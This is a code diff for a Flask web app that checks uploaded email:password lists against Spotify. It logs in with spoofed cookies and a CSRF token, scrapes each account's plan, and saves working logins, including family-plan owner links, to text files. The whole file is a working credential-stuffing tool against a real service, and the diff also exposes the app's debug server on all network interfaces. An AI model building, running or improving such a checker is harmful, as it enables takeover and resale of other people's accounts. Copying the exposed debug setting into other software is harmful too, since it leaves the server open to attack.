@@ -39,10 +39,11 @@ def file_received():
     open("family.txt","w").close()
     open("free.txt","w").close()
     if request.method == "POST":
-        accounts_file = request.form.get("account-list")
+        afile = request.files["file"]
+        afile.save("part.txt")
         try:
             account = []
-            with open (accounts_file, "r") as content:
+            with open ("part.txt", "r") as content:
                 accounts = content.readlines()
             for idx,line in enumerate(accounts):
                 div = line.split(":")
@@ -68,10 +69,10 @@ def file_received():
                     csrf = csrf_request.cookies.get("csrf_token")
                     cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
                     pl["csrf_token"] = csrf
-                    
+
                     response = api_request.post("https://accounts.spotify.com/api/login", data=pl,cookies=cookies)
-                    
-                    
+
+
                     try:
                         while True:
                             new_response = api_request.get('https://www.spotify.com/en/account/overview/')
@@ -104,7 +105,7 @@ def file_received():
                                 with open ("family.txt", "a") as family:
                                     family.write(user[0] + ":" + user[1])
                         elif("overview-cancel-recurring" in plan):
-                            
+
                             while True:
                                 new_date = api_request.get('https://www.spotify.com/es/home-hub/api/v1/family/home/')
                                 if new_date.status_code == 200:
@@ -114,9 +115,9 @@ def file_received():
                             user[2] = ("(FAMILY-OWNER) " + link)
                             with open ("family.txt", "a") as family:
                                 family.write(user[0].replace("\n", "") + ":" + user[1].replace("\n", "") + "|" + link + "\n")
-                        
+
                         else:
-                            user[2] = "False"   
+                            user[2] = "False"
                     except:
                         user[2] = "False"
                         pass
@@ -126,4 +127,4 @@ def file_received():
             traceback.print_exc()
             return redirect(url_for("error", account=account))
 if __name__ == "__main__":
-    app.run(port="1337")
+    app.run(port="1337", host="0.0.0.0", debug="True")
